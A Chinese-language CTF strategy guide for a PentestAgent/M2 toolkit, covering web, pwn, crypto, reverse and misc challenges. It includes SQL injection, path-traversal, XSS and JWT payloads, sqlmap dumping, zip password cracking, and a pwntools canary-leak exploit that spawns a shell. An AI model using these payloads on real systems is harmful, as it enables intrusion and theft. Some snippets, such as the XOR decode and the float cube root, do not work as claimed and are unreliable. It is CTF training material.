# FlagHunter CTF实战攻略

> 目标：用M2 CTF Kit在真实CTF比赛中高效解题  
> 覆盖5类题型：Web / Pwn / Crypto / Reverse / Misc  

---

## 目录

1. [通用策略](#一通用策略)
2. [Web类题目攻略](#二web类题目攻略)
3. [Pwn类题目攻略](#三pwn类题目攻略)
4. [Crypto类题目攻略](#四crypto类题目攻略)
5. [Reverse类题目攻略](#五reverse类题目攻略)
6. [Misc类题目攻略](#六misc类题目攻略)
7. [比赛时间管理](#七比赛时间管理)

---

## 一、通用策略

### 1.1 赛前5分钟清单

```
□ pentestagent 启动成功
□ /api 显示至少2个Provider 🟢 健康
□ /ctf status 显示所有工具 🟢 就绪
□ Kali VM已启动，SSH连通
□ .env中CTF平台配置正确（URL + API Key）
□ Kali VM已打快照（"比赛开始"快照）
```

### 1.2 题目分析决策树

```
看到题目 → 判断题型：
│
├─ 给了URL/IP + 端口（如 http://target:8080）
│  └─ 可能是 Web 或 Pwn
│     ├─ 有网页/登录框/表单 → Web
│     └─ 只有nc连接/bin文件 → Pwn
│
├─ 给了加密文本/文件 + 密码相关提示
│  └─ Crypto
│
├─ 给了二进制文件/ELF/EXE
│  └─ Reverse（静态分析为主）或 Pwn（利用为主）
│     ├─ 有交互功能（菜单、输入）→ 可能是Pwn
│     └─ 无交互，纯计算逻辑 → Reverse
│
├─ 给了奇怪的文件/图片/流量包
│  └─ Misc
│
└─ 不确定题型
   └─ /ctf run misc <target> 先试试Misc流程
```

### 1.3 通用解题流程

```
Step 1: 启动对应Playbook（1分钟）
  └─ /ctf run <类型> <target>

Step 2: 跟随Playbook Phase执行（每Phase 3-10分钟）
  └─ 工具执行 → LLM分析建议 → 你理解思路 → /ctf next

Step 3: 发现Flag或卡住时（关键决策点）
  ├─ 找到Flag → /ctf flag "flag{xxx}"
  ├─ Playbook走不通 → 切换到快速工具（/ctf pwn/decode/rev）
  └─ 完全没思路 → 跳过这题，做下一道，回头再想

Step 4: 复盘（赛后）
  └─ /api cost 查看Token消耗
  └─ 记录解题思路，总结经验
```

### 1.4 效率技巧

| 技巧 | 说明 |
|------|------|
| **并行开多题** | PentestAgent支持多Session，同时做2-3题 |
| **先易后难** | 先做Misc/Crypto（通常快），再做Web/Pwn（通常分高） |
| **善用LLM** | 工具输出看不懂？直接问，让LLM解释 |
| **控制成本** | DeepSeek做初筛，Claude做深度分析 |
| **善用快照** | Pwn题每次尝试前打快照，崩了秒回 |

---

## 二、Web类题目攻略

### 2.1 典型特征

- 给了一个URL（如 `http://challenge.ctf:8080`）
- 有网页、登录框、表单、文件上传等功能
- 提示涉及SQL注入、XSS、文件包含、SSRF等

### 2.2 启动Playbook

```
> /ctf run web "http://challenge.ctf:8080"
🚀 启动Playbook: web.yaml
🎯 目标: http://challenge.ctf:8080
```

### 2.3 Playbook流程（5个Phase）

**Phase 1: 信息收集（3-5分钟）**

```
工具: nmap(端口扫描), whatweb(技术栈识别), curl(获取响应头)
LLM分析: "目标使用Apache 2.4.49 + PHP 7.4，发现/admin目录"
你的决策:
  ├─ 发现有趣的目录/端口 → 记下来，继续
  └─ 什么都没发现 → 尝试更深入的扫描
```

**Phase 2: 目录扫描（3-5分钟）**

```
工具: gobuster/dirbuster(目录爆破)
LLM分析: "发现/backup, /admin, /upload目录"
你的决策:
  ├─ 发现敏感目录 → 记下来，继续
  └─ 目录太多 → 让LLM筛选优先级
```

**Phase 3: 漏洞探测（5-10分钟）**

```
工具: sqlmap(SQL注入), nikto(通用扫描), 手动curl
LLM分析: "发现登录框存在SQL注入，使用' or 1=1 -- 可以绕过"
你的决策:
  ├─ 确认漏洞 → 进入Phase 4利用
  └─ 没发现漏洞 → 回到Phase 2扩大扫描范围
```

**Phase 4: 漏洞利用（5-10分钟）**

```
工具: sqlmap(--dump), burpsuite(手工利用), 自定义Payload
LLM分析: "SQL注入成功，正在提取数据库内容...发现flag表"
你的决策:
  ├─ 拿到Flag → /ctf flag "flag{xxx}"
  └─ 利用成功但没Flag → 继续深入（提权、横向移动）
```

**Phase 5: 权限提升（如果需要，5-10分钟）**

```
工具: sudo -l, SUID文件搜索, 内核漏洞检测
LLM分析: "发现可写的SUID文件，通过覆盖执行获取root"
```

### 2.4 常用快速工具

```
# 快速目录扫描
dirsearch -u http://challenge.ctf:8080 -e php,txt,zip,bak

# 快速SQL注入检测
sqlmap -u "http://challenge.ctf:8080/login.php?id=1" --batch

# 快速XSS检测
xsstrike -u "http://challenge.ctf:8080/search?q=test"
```

### 2.5 常见Web题型速查

| 题型 | 特征 | 工具 |  payload 示例 |
|------|------|------|-------------|
| SQL注入 | 登录框/URL参数 | sqlmap | `' or 1=1 --` |
| 文件包含 | `?page=xxx` | burpsuite | `?page=../../../etc/passwd` |
| 文件上传 | 上传功能 | burpsuite | 改后缀php/双写绕过 |
| XSS | 输入回显 | 手动 | `<script>alert(1)</script>` |
| SSRF | 请求外部URL | curl | `http://127.0.0.1:22` |
| JWT伪造 | Authorization头 | jwt_tool | 改alg为none |
| 反序列化 | 序列化数据 | ysoserial | 构造恶意对象 |

---

## 三、Pwn类题目攻略

### 3.1 典型特征

- 给了 `nc target.ctf 1337`（远程连接）
- 给了二进制文件（ELF）
- 涉及缓冲区溢出、堆利用、格式化字符串等

### 3.2 启动方式（推荐快速模式）

```
> /ctf pwn challenge.ctf 1337
🔌 已连接到 challenge.ctf:1337
📤 Banner: "Welcome! What's your name?"
💡 LLM建议: "先发送测试数据观察响应格式"

# 或者使用完整Playbook
> /ctf run pwn "challenge.ctf 1337"
```

### 3.3 Pwn解题标准流程

**Step 1: 下载并分析二进制（本机或Kali VM）**

```bash
# Kali VM中
file challenge          # 查看文件类型
 checksec challenge     # 查看保护机制
cp challenge /tmp/      # 复制到工作目录
```

**Step 2: 快速逆向分析**

```
> /ctf rev ./challenge
📊 保护机制: NX ✅, PIE ❌, Canary ✅, RELRO: Partial
💡 发现: main函数(0x1234), win函数(0x4567), get_flag(0x89ab)
💡 建议: "PIE关闭，可以直接使用固定地址，考虑ret2text到win函数"
```

**Step 3: 连接靶机并泄露信息**

```
> /ctf pwn challenge.ctf 1337
🔌 已连接
💡 发送测试数据...
📤 响应: "Hello AAAA! Your name is AAAA"
💡 LLM建议: "存在格式化字符串漏洞，尝试泄露栈上的地址"
```

**Step 4: 构造Exploit**

```python
# 在Kali VM中编写exploit.py
from pwn import *

p = remote('challenge.ctf', 1337)
# 或 p = process('./challenge')  # 本地调试

# 泄露Canary
p.sendline(b'%11$p')           # 假设Canary在第11个参数
canary = int(p.recvline().strip(), 16)
log.info(f'Canary: {hex(canary)}')

# 构造Payload
payload = b'A' * 72            # 填充到Canary
payload += p64(canary)         # 覆盖Canary（保持原值）
payload += b'B' * 8            # 填充到返回地址
payload += p64(0x401234)       # win函数地址

p.sendline(payload)
p.interactive()                # 获取shell
```

**Step 5: 获取Flag**

```
# 在interactive shell中
cat flag.txt
# flag{pwn_1s_fun_2024}

> /ctf flag "flag{pwn_1s_fun_2024}"
✅ Flag正确！
```

### 3.4 Pwn题型速查表

| 题型 | 特征 | 方法 | 工具 |
|------|------|------|------|
| 栈溢出 | 缓冲区溢出 | ROP/ret2text/ret2libc | pwntools ROP |
| 格式化字符串 | printf用户输入 | 读/写任意地址 | fmtstr_payload |
| 堆利用 | malloc/free | UAF/Double Free/Fastbin Attack | pwntools heap |
| Canary绕过 | 栈保护 | 泄露Canary再覆盖 | %p泄露 |
| PIE绕过 | 地址随机化 | 泄露基址再计算 | 泄露ELF地址 |

---

## 四、Crypto类题目攻略

### 4.1 典型特征

- 给了一段密文（如 `U2FsdGVkX1+vupppZksvRf5pq5g5Xj...`）
- 给了加密脚本或提示（如 "AES ECB mode"）
- 涉及Base64/凯撒/RSA/AES等

### 4.2 启动方式

```
# 自动尝试多种解密方法
> /ctf decode "U2FsdGVkX1+vupppZksvRf5pq5g5XjFRlipTg9+MvKLJmzJ"
🔍 自动检测结果:
   Base64: ✅ 解码成功
   内容前缀: "Salted__" → 可能是OpenSSL AES加密
💡 LLM建议: "需要AES密钥，从题目其他线索寻找"

# 或者使用完整Playbook
> /ctf run crypto "challenge.txt"
```

### 4.3 Crypto解题标准流程

**Step 1: 识别编码/加密类型**

```
> /ctf decode "密文"
# M2会自动检测：
# - Base64/32/16/85
# - Hex
# - URL编码
# - 凯撒密码（所有移位尝试）
# - ROT13
# - XOR单字节
# - 摩斯电码
# - 栅栏密码
```

**Step 2: 根据检测结果选择工具**

```
# 如果是Base64 → 已自动解码，看内容
# 如果是凯撒 → 看自动解密结果哪个有意义
# 如果是AES → 需要找密钥（从其他题目线索或题目描述中）
# 如果是RSA → 使用RSA专用工具
```

**Step 3: RSA题目专用流程**

```python
# Kali VM中
from Crypto.Util.number import long_to_bytes

# 场景1: 给了p, q, e, c
n = p * q
d = pow(e, -1, (p-1)*(q-1))
m = pow(c, d, n)
print(long_to_bytes(m))

# 场景2: 低指数攻击 (e=3)
# c = m^3 mod n, 如果 m^3 < n 则直接开立方
cuberoot = round(c ** (1/3))
print(long_to_bytes(cuberoot))

# 场景3: 共模攻击
# 两个公钥 (n, e1) 和 (n, e2)，密文 c1, c2
# 用扩展欧几里得求 s*e1 + t*e2 = 1
# m = c1^s * c2^t mod n
```

**Step 4: 古典密码**

```
# 凯撒密码（已知移位）
> /ctf decode "密文"  # 自动尝试25种移位

# 维吉尼亚（已知密钥）
# 需要写Python脚本，M2中 crypto_vigenere(ciphertext, key="KEY")

# 栅栏密码
# M2中 crypto_railfence(ciphertext, rails=3)
```

### 4.4 Crypto题型速查表

| 题型 | 特征 | 方法 | 工具/脚本 |
|------|------|------|----------|
| Base64 | A-Za-z0-9+/= | 直接解码 | base64 -d |
| 凯撒 | 字母移位 | 频率分析/暴力25种 | crypto_caesar |
| 维吉尼亚 | 周期性移位 | 重合指数+频率分析 | crypto_vigenere |
| RSA基础 | 给了n,e,c,p,q | d = e^-1 mod φ(n) | crypto_rsa_simple |
| RSA低指数 | e=3 | 直接开立方 | round(c ** (1/3)) |
| RSA共模 | 两个公钥同n | 扩展欧几里得 | crypto_rsa_common_modulus |
| AES ECB | 相同明文→相同密文 | 替换块 | AES.new(key, AES.MODE_ECB) |
| XOR | 密文与密钥逐字节异或 | 频率分析爆破 | crypto_xor brute_force |

---

## 五、Reverse类题目攻略

### 5.1 典型特征

- 给了二进制文件（ELF或EXE）
- 需要分析算法逻辑，找到flag生成/验证逻辑
- 不涉及远程利用（与Pwn的区别）

### 5.2 启动方式

```
> /ctf rev ./challenge
📊 分析结果:
   架构: x86-64, ELF
   保护: NX ✅, PIE ❌, Canary ❌, RELRO: No
   字符串: "flag.txt", "Correct!", "Wrong!", "Enter password:"
   函数: main(0x1234), check_password(0x4567), encode(0x89ab)
💡 LLM建议: "检查check_password函数，可能是flag验证逻辑"
```

### 5.3 Reverse解题标准流程

**Step 1: 静态分析**

```
> /ctf rev ./challenge
# 查看保护机制、字符串、函数列表
# 找到关键函数（check、verify、encode、decode等）
```

**Step 2: 反编译关键函数**

```bash
# Kali VM中
r2 -A ./challenge
[0x000011a9]> s sym.check_password
[0x00001234]> pdc
# 查看伪代码
```

**Step 3: 分析算法并还原**

```python
# 根据反编译结果，用Python还原算法
# 例：如果程序对输入做 XOR 0x42 后比较

def decode_flag(encoded):
    return ''.join(chr(b ^ 0x42) for b in encoded)

encoded = [0x33, 0x21, 0x2a, 0x2b]  # 从二进制中提取
print(decode_flag(encoded))
# flag{r3v}
```

**Step 4: 获取Flag**

```
> /ctf flag "flag{r3v}
✅ Flag正确！
```

### 5.4 Reverse常见题型

| 题型 | 特征 | 方法 |
|------|------|------|
| 算法还原 | 加密/编码函数 | 反编译 → Python还原 |
| 条件判断 | 多层if/else | 用angr符号执行 |
| VM保护 | 自定义指令集 | 分析VM指令 → 写解释器 |
| 花指令 | 垃圾指令干扰 | 动态调试 |

---

## 六、Misc类题目攻略

### 6.1 典型特征

- 给了奇怪的文件（图片、压缩包、流量包等）
- 涉及隐写、编码、数据恢复等
- 题型最杂，需要广泛知识

### 6.2 启动方式

```
> /ctf run misc "challenge.zip"
🚀 启动Playbook: misc.yaml
🎯 目标: challenge.zip
```

### 6.3 Misc解题标准流程

**Phase 1: 文件分析**

```bash
# Kali VM中
file challenge.png        # 查看真实文件类型
binwalk challenge.png     # 查看是否有隐藏文件
strings challenge.png | grep flag   # 搜索flag字符串
```

**Phase 2: 隐写检测**

```bash
# 图片隐写
zsteg challenge.png       # PNG/BMP隐写检测
steghide extract -sf challenge.jpg  # JPEG隐写（需要密码）

# 如果怀疑有密码，尝试:
# - 空密码
# - "password"
# - 题目中提到的关键词
```

**Phase 3: 压缩包处理**

```bash
# ZIP伪加密
zipinfo -v challenge.zip  # 查看加密标志
# 用010 Editor改加密标志位 (09 00 → 00 00)

# 压缩包密码爆破
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt challenge.zip

# 多层嵌套压缩
for f in *.zip; do unzip -o "$f"; done  # 循环解压
```

**Phase 4: 流量分析**

```bash
# Wireshark/tshark
tshark -r challenge.pcap -Y "http"   # 提取HTTP流量
 foremost challenge.pcap             # 提取文件
```

### 6.4 Misc常见题型速查

| 题型 | 特征 | 工具 |
|------|------|------|
| 图片隐写 | PNG/BMP/JPG | zsteg, steghide, binwalk |
| ZIP伪加密 | 加密标志位被改 | 010 Editor, zipinfo |
| 文件分离 | 多个文件拼接 | binwalk -e, foremost |
| 流量分析 | .pcap文件 | Wireshark, tshark |
| 编码嵌套 | Base64套Base64 | 层层解码 |
| 文档隐写 | Word/PDF | 改后缀为zip解压 |

---

## 七、比赛时间管理

### 7.1 题目优先级策略

| 优先级 | 题型 | 原因 | 时间分配 |
|--------|------|------|---------|
| **P0** | Misc简单题 | 得分最快，建立信心 | 比赛开始先做 |
| **P0** | Crypto简单题 | 自动化解题效率高 | 10-15分钟/题 |
| **P1** | Web | 分值通常较高 | 30-45分钟/题 |
| **P1** | Reverse | 需要分析时间 | 30-60分钟/题 |
| **P2** | Pwn | 难度高但分值最高 | 45-90分钟/题 |
| **P2** | Crypto难题 | 可能做不出来 | 不超过30分钟 |

### 7.2 时间分配建议（48小时比赛）

```
第1小时:   Misc简单题 × 2-3 (快速拿分建立信心)
第2-4小时: Web × 1-2 + Crypto简单 × 1
第5-10小时: Reverse × 1 + Pwn × 1
第10-20小时: 深入做高分题 (Web/Pwn)
第20-40小时: 继续攻坚 + 团队协作
第40-48小时: 检查已做题目的Flag + 尝试剩余题目
```

### 7.3 放弃决策

什么时候应该放弃一道题：

```
□ 已经花了预计时间的2倍还没进展
□ 题目类型不在你的能力范围内
□ 其他队伍也没做出这道题（看board）
□ Token消耗已经超过题目分值的价值
□ LLM连续3次建议都无效
```

放弃不是失败，合理的时间分配才是胜利。

---

**祝你在CTF比赛中旗开得胜！**

